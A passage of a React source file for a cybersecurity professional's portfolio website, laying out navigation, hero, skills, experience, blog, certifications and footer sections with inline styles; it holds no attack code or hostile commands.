          <p style={{ fontSize: "12px", lineHeight: 1.65, color: "rgba(232,232,240,0.45)", margin: "0 0 20px" }}>{post.summary}</p>
        </div>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <div style={{ display: "flex", gap: "12px" }}>
            <span style={{ fontSize: "10px", color: "rgba(232,232,240,0.25)", fontFamily: "'DM Mono', monospace" }}>{post.date}</span>
            <span style={{ fontSize: "10px", color: "rgba(232,232,240,0.2)", fontFamily: "'DM Mono', monospace" }}>{post.readTime}</span>
          </div>
          <span style={{ fontSize: "10px", color: "#e63946", fontFamily: "'DM Mono', monospace", letterSpacing: "1px", opacity: hov ? 1 : 0, transition: "opacity 0.2s" }}>READ →</span>
        </div>
      </div>
    </div>
  );
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
export default function Portfolio() {
  const [activeNav, setActiveNav] = useState("About");
  const [scrolled, setScrolled] = useState(false);
  const [activeExp, setActiveExp] = useState(0);
  const [imgLoaded, setImgLoaded] = useState(false);
  const [openPost, setOpenPost] = useState(null);

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 40);
    window.addEventListener("scroll", onScroll);
    return () => window.removeEventListener("scroll", onScroll);
  }, []);

  const scrollTo = (id) => {
    document.getElementById(id.toLowerCase())?.scrollIntoView({ behavior: "smooth" });
    setActiveNav(id);
  };

  const featured = BLOG_POSTS.find(p => p.pinned);
  const rest = BLOG_POSTS.filter(p => !p.pinned);

  return (
    <>
      <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet" />
      <div style={{ minHeight: "100vh", background: "#0a0a0f", color: "#e8e8f0", fontFamily: "'Syne', sans-serif", overflowX: "hidden" }}>

        {/* ── BLOG MODAL ── */}
        {openPost && <BlogModal post={openPost} onClose={() => setOpenPost(null)} />}

        {/* ── NAV ── */}
        <nav style={{ position: "fixed", top: 0, left: 0, right: 0, zIndex: 100, padding: "0 48px", height: "64px", display: "flex", alignItems: "center", justifyContent: "space-between", background: scrolled ? "rgba(10,10,15,0.93)" : "transparent", backdropFilter: scrolled ? "blur(16px)" : "none", borderBottom: "none", transition: "all 0.4s ease" }}>
          <div onClick={() => scrollTo("About")} style={{ width: "36px", height: "36px", borderRadius: "50%", overflow: "hidden", outline: "none", boxShadow: "none", cursor: "pointer", flexShrink: 0 }}>
            <img src={PROFILE_PHOTO} alt="Nassim Chami" style={{ width: "100%", height: "100%", objectFit: "cover", filter: "brightness(0.9) saturate(0.85)" }} />
          </div>
          <ul style={{ display: "flex", gap: "32px", listStyle: "none", margin: 0, padding: 0 }}>
            {NAV_LINKS.map(l => (
              <li key={l} onClick={() => scrollTo(l)} style={{ fontSize: "12px", letterSpacing: "0.5px", cursor: "pointer", color: activeNav === l ? "#e63946" : "rgba(232,232,240,0.5)", fontWeight: activeNav === l ? 600 : 400, transition: "color 0.2s", fontFamily: "'DM Mono', monospace" }}>{l}</li>
            ))}
          </ul>
          <div style={{ width: "36px" }} />
        </nav>

        {/* ── HERO ── */}
        <section id="about" style={{ minHeight: "100vh", display: "flex", alignItems: "center", padding: "80px 80px 0", position: "relative", overflow: "hidden" }}>
          <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse 70% 60% at 70% 40%, rgba(230,57,70,0.06) 0%, transparent 70%)", pointerEvents: "none" }} />
          <div style={{ position: "absolute", inset: 0, backgroundImage: "linear-gradient(rgba(255,255,255,0.022) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.022) 1px, transparent 1px)", backgroundSize: "60px 60px", pointerEvents: "none", maskImage: "radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%)" }} />
          <div style={{ position: "relative", zIndex: 2, display: "grid", gridTemplateColumns: "1fr 360px", gap: "80px", alignItems: "center", width: "100%", maxWidth: "1200px" }}>
            <div>
              <div style={{ display: "inline-flex", alignItems: "center", gap: "8px", padding: "6px 14px", background: "rgba(230,57,70,0.1)", border: "1px solid rgba(230,57,70,0.25)", borderRadius: "4px", fontSize: "11px", letterSpacing: "2.5px", textTransform: "uppercase", color: "#e63946", fontFamily: "'DM Mono', monospace", marginBottom: "28px" }}>
                <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#e63946", display: "inline-block" }} />
                Available for Engagements
              </div>
              <h1 style={{ fontSize: "clamp(48px, 7vw, 88px)", fontWeight: 800, lineHeight: 1, letterSpacing: "-2px", color: "#fff", margin: "0 0 8px" }}>Nassim<br />Chami</h1>
              <div style={{ fontSize: "clamp(20px, 3vw, 36px)", fontWeight: 300, color: "rgba(232,232,240,0.35)", letterSpacing: "1px", marginBottom: "28px" }}>Red Team Operator</div>
              <p style={{ maxWidth: "500px", fontSize: "14px", lineHeight: 1.8, color: "rgba(232,232,240,0.5)", marginBottom: "44px" }}>
                Cybersecurity professional specializing in offensive security and vulnerability assessment. I identify and analyze critical vulnerabilities to help organizations strengthen their cyber defense posture — guided by technical precision and ethical responsibility.
              </p>
              <div style={{ display: "flex", gap: "16px", alignItems: "center", flexWrap: "wrap" }}>
                <button onClick={() => scrollTo("Experience")} style={{ padding: "13px 28px", background: "#e63946", color: "#fff", border: "none", borderRadius: "4px", fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "'Syne', sans-serif" }}>View Experience</button>
                <button onClick={() => scrollTo("Blog")} style={{ padding: "13px 28px", background: "transparent", color: "rgba(232,232,240,0.7)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: "4px", fontSize: "13px", cursor: "pointer", fontFamily: "'Syne', sans-serif" }}>Read Blog</button>
                <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.25)", fontFamily: "'DM Mono', monospace" }}>Salé, Morocco · +212 628-126-291</span>
              </div>
            </div>
            <div style={{ position: "relative" }}>

              <div style={{ position: "relative", zIndex: 1, overflow: "hidden", borderRadius: "2px", aspectRatio: "3/4", background: "#0a0a0f" }}>
                <img src={PROFILE_PHOTO} alt="Nassim Chami" onLoad={() => setImgLoaded(true)} style={{ width: "100%", height: "100%", objectFit: "cover", objectPosition: "center top", filter: "brightness(0.85) contrast(1.1) saturate(0.8)", opacity: imgLoaded ? 1 : 0, transition: "opacity 0.5s ease" }} />
                <div style={{ position: "absolute", inset: 0, background: "linear-gradient(0deg, rgba(10,10,15,0.85) 0%, rgba(10,10,15,0.1) 40%, rgba(10,10,15,0.1) 70%, rgba(10,10,15,0.7) 100%)", pointerEvents: "none" }} />
                <div style={{ position: "absolute", bottom: "20px", left: "16px", right: "16px", display: "flex", gap: "10px" }}>
                  {[["3+", "Years"], ["6", "Certs"], ["181", "Followers"]].map(([n, l]) => (
                    <div key={l} style={{ flex: 1, padding: "10px 6px", background: "rgba(10,10,15,0.78)", backdropFilter: "blur(10px)", border: "1px solid rgba(255,255,255,0.08)", textAlign: "center" }}>
                      <div style={{ fontSize: "19px", fontWeight: 800, color: "#fff", lineHeight: 1 }}>{n}</div>
                      <div style={{ fontSize: "9px", letterSpacing: "1.5px", color: "rgba(232,232,240,0.4)", fontFamily: "'DM Mono', monospace", marginTop: "4px" }}>{l}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* ── SKILLS ── */}
        <section id="skills" style={{ padding: "100px 80px", background: "rgba(255,255,255,0.015)" }}>
          <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
            <FadeIn><SectionLabel>02 — Skills & Expertise</SectionLabel></FadeIn>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "2px" }}>
              {SKILLS.map((skill, i) => (
                <FadeIn key={skill.category} delay={i * 0.1}>
                  <div style={{ padding: "36px", background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.06)", transition: "all 0.3s" }}
                    onMouseEnter={e => { e.currentTarget.style.borderColor = "rgba(230,57,70,0.3)"; e.currentTarget.style.background = "rgba(230,57,70,0.04)"; }}
                    onMouseLeave={e => { e.currentTarget.style.borderColor = "rgba(255,255,255,0.06)"; e.currentTarget.style.background = "rgba(255,255,255,0.03)"; }}>
                    <span style={{ fontSize: "22px", color: "#e63946", marginBottom: "16px", display: "block" }}>{skill.icon}</span>
                    <div style={{ fontSize: "15px", fontWeight: 700, color: "#fff", marginBottom: "20px" }}>{skill.category}</div>
                    <div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
                      {skill.items.map(item => (
                        <span key={item} style={{ padding: "5px 12px", background: "rgba(230,57,70,0.07)", border: "1px solid rgba(230,57,70,0.15)", borderRadius: "3px", fontSize: "11px", color: "rgba(232,232,240,0.65)", fontFamily: "'DM Mono', monospace" }}>{item}</span>
                      ))}
                    </div>
                  </div>
                </FadeIn>
              ))}
            </div>
          </div>
        </section>

        {/* ── EXPERIENCE ── */}
        <section id="experience" style={{ padding: "100px 80px" }}>
          <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
            <FadeIn><SectionLabel>03 — Experience</SectionLabel></FadeIn>
            <FadeIn delay={0.1}>
              <div style={{ display: "grid", gridTemplateColumns: "260px 1fr", gap: "2px" }}>
                <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
                  {EXPERIENCE.map((e, i) => (
                    <div key={i} onClick={() => setActiveExp(i)} style={{ padding: "20px 24px", cursor: "pointer", background: activeExp === i ? "rgba(230,57,70,0.08)" : "rgba(255,255,255,0.02)", borderLeft: activeExp === i ? "2px solid #e63946" : "2px solid transparent", transition: "all 0.2s" }}>
                      <div style={{ fontSize: "13px", fontWeight: 700, color: "#fff", marginBottom: "4px" }}>{e.company}</div>
                      <div style={{ fontSize: "10px", color: "rgba(232,232,240,0.35)", fontFamily: "'DM Mono', monospace", letterSpacing: "1px" }}>{e.period}</div>
                    </div>
                  ))}
                </div>
                <div style={{ padding: "36px 40px", background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.06)" }}>
                  <div style={{ fontSize: "22px", fontWeight: 700, color: "#fff", marginBottom: "6px" }}>{EXPERIENCE[activeExp].role}</div>
                  <div style={{ display: "flex", gap: "16px", marginBottom: "32px" }}>
                    {[EXPERIENCE[activeExp].company, EXPERIENCE[activeExp].location, EXPERIENCE[activeExp].type].map((m, i) => (
                      <span key={i} style={{ fontSize: "11px", color: i === 2 ? "#e63946" : "rgba(232,232,240,0.4)", fontFamily: "'DM Mono', monospace", letterSpacing: "1px" }}>{m}</span>
                    ))}
                  </div>
                  <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                    {EXPERIENCE[activeExp].highlights.map((h, i) => (
                      <div key={i} style={{ display: "flex", gap: "14px", fontSize: "14px", lineHeight: 1.7, color: "rgba(232,232,240,0.65)" }}>
                        <span style={{ color: "#e63946", marginTop: "4px", flexShrink: 0, fontSize: "10px" }}>▸</span>
                        <span>{h}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </FadeIn>
          </div>
        </section>

        {/* ── BLOG ── */}
        <section id="blog" style={{ padding: "100px 80px", background: "rgba(255,255,255,0.015)" }}>
          <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
            <FadeIn>
              <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "56px" }}>
                <span style={{ fontSize: "11px", letterSpacing: "3px", textTransform: "uppercase", color: "#e63946", fontFamily: "'DM Mono', monospace", fontWeight: 500, whiteSpace: "nowrap" }}>04 — Blog & Write-ups</span>
                <div style={{ flex: 1, height: "1px", background: "linear-gradient(90deg, #e63946 0%, rgba(230,57,70,0.08) 100%)" }} />
                <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.25)", fontFamily: "'DM Mono', monospace", whiteSpace: "nowrap" }}>{BLOG_POSTS.length} ARTICLES</span>
              </div>
            </FadeIn>

            {featured && (
              <FadeIn delay={0.05}>
                <BlogFeatured post={featured} onClick={() => setOpenPost(featured)} />
              </FadeIn>
            )}

            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "2px", marginTop: "2px" }}>
              {rest.map((post, i) => (
                <FadeIn key={post.id} delay={i * 0.08}>
                  <BlogCard post={post} onClick={() => setOpenPost(post)} />
                </FadeIn>
              ))}
            </div>
          </div>
        </section>

        {/* ── CERTIFICATIONS ── */}
        <section id="certifications" style={{ padding: "100px 80px" }}>
          <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
            <FadeIn><SectionLabel>05 — Certifications & Achievements</SectionLabel></FadeIn>
            <FadeIn delay={0.1}>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "2px", marginBottom: "60px" }}>
                {CERTIFICATIONS.map((c, i) => (
                  <div key={i} style={{ padding: "28px 32px", background: c.active ? "rgba(230,57,70,0.06)" : "rgba(255,255,255,0.02)", border: `1px solid ${c.active ? "rgba(230,57,70,0.2)" : "rgba(255,255,255,0.05)"}`, opacity: c.active ? 1 : 0.45 }}>
                    <div style={{ fontSize: "13px", fontWeight: 700, color: "#e63946", fontFamily: "'DM Mono', monospace", letterSpacing: "1px", marginBottom: "10px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span>{c.code}</span>
                      {!c.active && <span style={{ fontSize: "9px", padding: "2px 8px", background: "rgba(255,255,255,0.06)", borderRadius: "2px", letterSpacing: "1.5px", color: "rgba(232,232,240,0.3)" }}>REVOKED</span>}
                    </div>
                    <div style={{ fontSize: "14px", fontWeight: 600, color: "#fff", marginBottom: "6px" }}>{c.name}</div>
                    <div style={{ fontSize: "11px", color: "rgba(232,232,240,0.4)", fontFamily: "'DM Mono', monospace", letterSpacing: "1px" }}>{c.org}</div>
                  </div>
                ))}
              </div>
            </FadeIn>
            <FadeIn delay={0.2}>
              <div style={{ fontSize: "11px", letterSpacing: "2px", textTransform: "uppercase", color: "rgba(232,232,240,0.3)", fontFamily: "'DM Mono', monospace", marginBottom: "16px" }}>Accomplishments</div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "2px" }}>
                {ACCOMPLISHMENTS.map((a, i) => (
                  <div key={i} style={{ padding: "28px 32px", background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.06)" }}>
                    <div style={{ fontSize: "18px", fontWeight: 800, color: "#e63946", marginBottom: "8px" }}>{a.title}</div>
                    <div style={{ fontSize: "12px", color: "rgba(232,232,240,0.45)", fontFamily: "'DM Mono', monospace", letterSpacing: "1px" }}>{a.event}</div>
                  </div>
                ))}
              </div>
            </FadeIn>
          </div>
        </section>

        {/* ── FOOTER ── */}
        <footer style={{ padding: "40px 80px", borderTop: "1px solid rgba(255,255,255,0.06)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <span style={{ fontSize: "13px", fontWeight: 700, color: "rgba(232,232,240,0.3)" }}>NASSIM CHAMI — RED TEAM OPERATOR</span>
          <div style={{ display: "flex", gap: "24px" }}>
            {[["Email", "mailto:nassimchami5@gmail.com"], ["Medium", "https://nassimchami.medium.com"], ["HackerOne", "#"]].map(([label, href]) => (
              <a key={label} href={href} target="_blank" rel="noopener noreferrer"
                style={{ fontSize: "11px", color: "rgba(232,232,240,0.35)", fontFamily: "'DM Mono', monospace", textDecoration: "none", letterSpacing: "1px", transition: "color 0.2s" }}
                onMouseEnter={e => e.target.style.color = "#e63946"}
                onMouseLeave={e => e.target.style.color = "rgba(232,232,240,0.35)"}>
                {label.toUpperCase()}
              </a>
            ))}
          </div>
        </footer>

      </div>
    </>
  );
}